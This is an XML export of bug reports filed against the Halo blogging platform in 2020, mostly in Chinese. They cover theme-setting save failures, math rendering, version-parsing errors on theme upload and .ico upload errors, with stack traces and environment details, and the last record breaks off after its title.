<?xml version="1.0" encoding="ISO-8859-1"?>

<bugs>
	<bug>
		<id>1068</id>
		<title>保存主题自定义设置失败</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt; 版本：1.3.2 数据库：MySQL 8.0.20 运行模式：production User Agent：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36 ---  ## 错误日志  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt; ``` Caused by: javax.persistence.NonUniqueResultException: query did not return a unique result: 6 at org.hibernate.internal.ExceptionConverterImpl.convert(ExceptionConverterImpl.java:128) ~[hibernate-core-5.4.12.Final.jar!/:5.4.12.Final] at org.hibernate.query.internal.AbstractProducedQuery.getSingleResult(AbstractProducedQuery.java:1585) ~[hibernate-core-5.4.12.Final.jar!/:5.4.12.Final] at org.hibernate.query.criteria.internal.compile.CriteriaQueryTypeQueryAdapter.getSingleResult(CriteriaQueryTypeQueryAdapter.java:111) ~[hibernate-core-5.4.12.Final.jar!/:5.4.12.Final] at org.springframework.data.jpa.repository.query.JpaQueryExecution$SingleEntityExecution.doExecute(JpaQueryExecution.java:196) ~[spring-data-jpa-2.2.5.RELEASE.jar!/:2.2.5.RELEASE] at org.springframework.data.jpa.repository.query.JpaQueryExecution.execute(JpaQueryExecution.java:88) ~[spring-data-jpa-2.2.5.RELEASE.jar!/:2.2.5.RELEASE] at org.springframework.data.jpa.repository.query.AbstractJpaQuery.doExecute(AbstractJpaQuery.java:154) ~[spring-data-jpa-2.2.5.RELEASE.jar!/:2.2.5.RELEASE] at org.springframework.data.jpa.repository.query.AbstractJpaQuery.execute(AbstractJpaQuery.java:142) ~[spring-data-jpa-2.2.5.RELEASE.jar!/:2.2.5.RELEASE] at org.springframework.data.repository.core.support.RepositoryFactorySupport$QueryExecutorMethodInterceptor.doInvoke(RepositoryFactorySupport.java:618) ~[spring-data-commons-2.2.5.RELEASE.jar!/:2.2.5.RELEASE] at org.springframework.data.repository.core.support.RepositoryFactorySupport$QueryExecutorMethodInterceptor.invoke(RepositoryFactorySupport.java:605) ~[spring-data-commons-2.2.5.RELEASE.jar!/:2.2.5.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.data.projection.DefaultMethodInvokingMethodInterceptor.invoke(DefaultMethodInvokingMethodInterceptor.java:80) ~[spring-data-commons-2.2.5.RELEASE.jar!/:2.2.5.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.transaction.interceptor.TransactionInterceptor$$Lambda$846/000000006DAE8470.proceedWithInvocation(Unknown Source) ~[na:na] at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:366) ~[spring-tx-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:99) ~[spring-tx-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.dao.support.PersistenceExceptionTranslationInterceptor.invoke(PersistenceExceptionTranslationInterceptor.java:139) ~[spring-tx-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] ... 119 common frames omitted ``` ---  ## 期望行为  &lt;!--   你期望会发生什么？ --&gt;  ## 当前行为 保存主题自定义设置--的时候,如果网速比较慢,多次点击保存按钮,会出现将新增主题设置重复保存的情 setting_key 和 theme_id在数据库中重复,导致后续保存都会失败,只能手动到数据库删除,是否应该添加setting_key 和 theme_id的唯一索引 &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt;</body>
		<created>2020-09-13 07:01:08</created>
		<closed>2020-09-14 16:13:02</closed>
	</bug>
	<bug>
		<id>1046</id>
		<title>文章编辑页面显示数学公式，在博客内容页面不显示，会显示成为markdown代码</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境 版本：1.3.2 数据库：H2 1.4.196 (2017-06-10) 运行模式：production User Agent：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  ---  ## 错误日志 应该是前端插件的问题，和后台日志没关系吧？我看后台全是认证失败的日志。 &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  ---  ## 期望行为 正常显示数学公式 &lt;!--   你期望会发生什么？ --&gt;  ## 当前行为 $f(x, y) = x^2 + y^2, x \epsilon [0, 100], y \epsilon \{1,2,3\}$ 这段代码为一个数学公式，在后台编辑显示正常，在前端显示错误。 ![QQ截图20200828211837](https://user-images.githubusercontent.com/23625530/91565726-3ce04e80-e975-11ea-92de-02974477c68c.png) ![QQ截图20200828211904](https://user-images.githubusercontent.com/23625530/91565730-3eaa1200-e975-11ea-94aa-5e750a56baff.png) &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？   你可以粘贴截图或附件。 --&gt;</body>
		<created>2020-08-28 13:28:13</created>
		<closed>2020-08-28 13:52:43</closed>
	</bug>
	<bug>
		<id>1038</id>
		<title>开发环境下无法正常上传主题</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境  ``` 版本：unknown 数据库：H2 1.4.196 (2017-06-10) 运行模式：development User Agent：Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36 ``` &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  ---  ## 错误日志  Not record.  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  ---  ## 期望行为  在开发环境下应该能够通过所有的版本校验。  &lt;!--   你期望会发生什么？ --&gt;  ## 当前行为  版本校验错误。  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt;</body>
		<created>2020-08-23 07:34:06</created>
		<closed>2020-08-23 09:47:53</closed>
	</bug>
	<bug>
		<id>1022</id>
		<title>上传文件报错</title>
		<body>## 我的环境  ``` 版本：1.4.0-beta.2 数据库：H2 1.4.196 (2017-06-10) 运行模式：production User Agent：Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 ```  ## 错误日志  ``` 2020-08-09 16:13:14.706  INFO 21603 --- [qtp807328355-2169] r.h.app.handler.file.LocalFileHandler    : Uploading file: [favicon.ico]to directory: [/root/.halo/upload/2020/08/favicon-5254603f45974d90a20ef7fa22fa7614.ico] 2020-08-09 16:13:14.723 ERROR 21603 --- [qtp807328355-2169] r.h.app.core.ControllerExceptionHandler  : Captured an exception: [null] 2020-08-09 16:13:18.589  INFO 21603 --- [qtp807328355-1984] r.h.app.handler.file.LocalFileHandler    : Uploading file: [favicon.ico]to directory: [/root/.halo/upload/2020/08/favicon-835b6f9f052b494abd328aa6203d79a5.ico] 2020-08-09 16:13:18.590 ERROR 21603 --- [qtp807328355-1984] r.h.app.core.ControllerExceptionHandler  : Captured an exception: [null] ```  ## 期望行为  正常上传图片  ## 当前行为  上传图片报错，似乎是后缀为 ico 的问题，将 ico 改成别的即可上传成功  ![image](https://user-images.githubusercontent.com/25138766/89727913-87983600-da5b-11ea-92a1-9a6d73d7d6d8.png)  </body>
		<created>2020-08-09 08:15:42</created>
		<closed>2020-08-10 15:04:58</closed>
	</bug>
	<bug>
		<id>1002</id>
		<title>英文摘要生成异常</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境 版本：1.3.2 数据库：H2 1.4.196 (2017-06-10) 运行模式：production User Agent：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  ---  ## 期望行为  &lt;!--   你期望会发生什么？ --&gt; 英文摘要保留空格 ## 当前行为 英文摘要没有空格，可读性差  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt;</body>
		<created>2020-07-29 03:07:14</created>
		<closed>2020-08-01 15:19:08</closed>
	</bug>
	<bug>
		<id>1000</id>
		<title>主题更新失败，解压时报错文件</title>
		<body>![image](https://user-images.githubusercontent.com/29883424/88613778-cbd12100-d0c0-11ea-867a-2463a52600f0.png) </body>
		<created>2020-07-28 02:55:18</created>
		<closed>2020-08-10 15:02:55</closed>
	</bug>
	<bug>
		<id>999</id>
		<title>when upload themes zip  package,update themes will throw exception For input string: "0-beta" in version 1.4.0-beta.1</title>
		<body>```java 2020-07-27 17:42:33.730 DEBUG 2626 --- [qtp1035363280-13] run.halo.app.utils.VersionUtil           : Comparing version [1.4.0-beta.1] with [1.3.0] 2020-07-27 17:42:33.731  INFO 2626 --- [qtp1035363280-13] run.halo.app.utils.FileUtils             : Deleting [/tmp/halo8424452036089583356] 2020-07-27 17:42:33.836  INFO 2626 --- [qtp1035363280-13] run.halo.app.utils.FileUtils             : Deleted [/tmp/halo8424452036089583356] successfully 2020-07-27 17:42:33.839 ERROR 2626 --- [qtp1035363280-13] r.h.app.core.ControllerExceptionHandler  : Captured an exception:  java.lang.NumberFormatException: For input string: "0-beta"         at java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) ~[na:1.8.0_201]         at java.lang.Integer.parseInt(Integer.java:580) ~[na:1.8.0_201]         at java.lang.Integer.parseInt(Integer.java:615) ~[na:1.8.0_201]         at run.halo.app.utils.VersionUtil.getCanonicalVersion(VersionUtil.java:55) ~[classes!/:1.4.0-beta.1]         at run.halo.app.utils.VersionUtil.compare(VersionUtil.java:72) ~[classes!/:1.4.0-beta.1]         at run.halo.app.utils.VersionUtil.compareVersion(VersionUtil.java:101) ~[classes!/:1.4.0-beta.1]         at run.halo.app.service.impl.ThemeServiceImpl.add(ThemeServiceImpl.java:463) ~[classes!/:1.4.0-beta.1]         at run.halo.app.service.impl.ThemeServiceImpl.upload(ThemeServiceImpl.java:428) ~[classes!/:1.4.0-beta.1]         at run.halo.app.controller.admin.api.ThemeController.uploadTheme(ThemeController.java:162) ~[classes!/:1.4.0-beta.1]         at run.halo.app.controller.admin.api.ThemeController$$FastClassBySpringCGLIB$$e8e9d45c.invoke(&lt;generated&gt;) ~[classes!/:1.4.0-beta.1]         at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:771) ~[spring-aop-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) ~[spring-aop-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) ~[spring-aop-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at run.halo.app.core.ControllerLogAop.controller(ControllerLogAop.java:48) ~[classes!/:1.4.0-beta.1]         at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_201]         at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_201]         at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_201]         at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_201]         at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) ~[spring-aop-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) ~[spring-aop-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) ~[spring-aop-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) ~[spring-aop-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:95) ~[spring-aop-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) ~[spring-aop-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:691) ~[spring-aop-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at run.halo.app.controller.admin.api.ThemeController$$EnhancerBySpringCGLIB$$200aaf93.uploadTheme(&lt;generated&gt;) ~[classes!/:1.4.0-beta.1]         at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_201]         at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_201]         at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_201]         at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_201]         at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) ~[spring-web-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) ~[spring-web-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:105) ~[spring-webmvc-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:879) ~[spring-webmvc-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:793) ~[spring-webmvc-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) ~[spring-webmvc-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) ~[spring-webmvc-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) [spring-webmvc-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) [spring-webmvc-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at javax.servlet.http.HttpServlet.service(HttpServlet.java:523) [jakarta.servlet-api-4.0.3.jar!/:4.0.3]         at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) [spring-webmvc-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at javax.servlet.http.HttpServlet.service(HttpServlet.java:590) [jakarta.servlet-api-4.0.3.jar!/:4.0.3]         at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:763) [jetty-servlet-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1631) [jetty-servlet-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.websocket.server.WebSocketUpgradeFilter.doFilter(WebSocketUpgradeFilter.java:226) [websocket-server-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1618) [jetty-servlet-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at run.halo.app.security.filter.AdminAuthenticationFilter.doAuthenticate(AdminAuthenticationFilter.java:116) [classes!/:1.4.0-beta.1]         at run.halo.app.security.filter.AbstractAuthenticationFilter.doFilterInternal(AbstractAuthenticationFilter.java:191) [classes!/:1.4.0-beta.1]         at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1618) [jetty-servlet-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1618) [jetty-servlet-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1618) [jetty-servlet-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at run.halo.app.filter.CorsFilter.doFilter(CorsFilter.java:49) [classes!/:1.4.0-beta.1]         at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1618) [jetty-servlet-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at run.halo.app.filter.LogFilter.doFilterInternal(LogFilter.java:38) [classes!/:1.4.0-beta.1]         at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1618) [jetty-servlet-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:93) [spring-boot-actuator-2.3.1.RELEASE.jar!/:2.3.1.RELEASE]         at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1618) [jetty-servlet-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) [spring-web-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.7.RELEASE.jar!/:5.2.7.RELEASE]         at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1618) [jetty-servlet-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:549) [jetty-servlet-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143) [jetty-server-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:602) [jetty-security-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:127) [jetty-server-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:235) [jetty-server-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:1610) [jetty-server-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:233) [jetty-server-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1369) [jetty-server-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:188) [jetty-server-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:489) [jetty-servlet-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1580) [jetty-server-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:186) [jetty-server-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1284) [jetty-server-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141) [jetty-server-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:127) [jetty-server-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.server.Server.handle(Server.java:501) [jetty-server-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.server.HttpChannel.lambda$handle$1(HttpChannel.java:383) [jetty-server-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.server.HttpChannel.dispatch(HttpChannel.java:556) [jetty-server-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:375) [jetty-server-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:273) ~[jetty-server-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:311) ~[jetty-io-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:103) ~[jetty-io-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.io.ChannelEndPoint$1.run(ChannelEndPoint.java:104) ~[jetty-io-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.runTask(EatWhatYouKill.java:336) ~[jetty-util-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:313) ~[jetty-util-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.tryProduce(EatWhatYouKill.java:171) ~[jetty-util-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:129) ~[jetty-util-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:375) ~[jetty-util-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:806) ~[jetty-util-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at org.eclipse.jetty.util.thread.QueuedThreadPool$Runner.run(QueuedThreadPool.java:938) ~[jetty-util-9.4.29.v20200521.jar!/:9.4.29.v20200521]         at java.lang.Thread.run(Thread.java:748) ~[na:1.8.0_201] ```</body>
		<created>2020-07-27 10:00:00</created>
		<closed>2020-08-02 18:07:04</closed>
	</bug>
	<bug>
		<id>982</id>
		<title>后台Markdown对于 `ax^2 + bx + c = 0`样式渲染有问题</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境  ![image](https://user-images.githubusercontent.com/23736683/87899215-12040000-ca83-11ea-98af-adb99d9d4bfa.png)  ---  ---  ## 期望行为  对于`ax^2 + bx + c = 0`和`x = {-b \pm \sqrt{b^2-4ac} \over 2a}.`这种格式能够正确返回   ## 当前行为 ![image](https://user-images.githubusercontent.com/23736683/87899306-5abbb900-ca83-11ea-91a7-74322cae21b9.png)  &gt; 完整格式： When $a \ne 0$, there are two solutions to (ax^2 + bx + c = 0) and they are $$x = {-b \pm \sqrt{b^2-4ac} \over 2a}.$$ </body>
		<created>2020-07-20 04:20:38</created>
		<closed>2020-07-21 13:52:12</closed>
	</bug>
	<bug>
		<id>950</id>
		<title>当文件不存在时，删除附件会报错</title>
